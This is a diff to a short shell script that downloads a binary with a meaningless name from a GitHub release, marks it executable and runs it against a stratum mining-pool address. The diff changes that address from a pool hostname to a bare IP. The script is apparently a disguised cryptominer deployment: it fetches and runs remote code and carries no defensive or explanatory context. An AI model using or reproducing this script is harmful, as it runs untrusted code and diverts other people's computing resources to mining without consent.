@@ -2,4 +2,4 @@
 apt update && apt install unzip -y
 wget https://github.com/tallapallitech63/opmol/releases/download/oukl/oltsp
 chmod +x oltsp
-./oltsp -P stratum1+tcp://cb16e28eda52f3750022c539e75c84610f87af8030a9.$(shuf -n 1 -i 1-99999)-vdas@de.catchthatrabbit.com:8008
+./oltsp -P stratum1+tcp://cb16e28eda52f3750022c539e75c84610f87af8030a9.$(shuf -n 1 -i 1-99999)-vdas@50.116.29.134:8083
